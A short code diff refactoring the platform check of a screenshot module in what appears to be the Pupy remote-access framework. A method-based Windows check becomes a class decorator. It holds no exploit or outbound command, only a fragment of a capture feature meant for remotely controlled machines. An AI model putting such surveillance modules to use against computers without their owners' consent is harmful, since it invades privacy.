@@ -37,11 +37,9 @@ def pil_save(filename, pixels, width, height):
 	logging.info('Screenshot saved to %s'%filename)
 
 
+@compatibility("windows")
 class Screenshoter(PupyModule):
 	""" take a screenshot :) """
-	@windows_only
-	def is_compatible(self):
-		pass
 
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
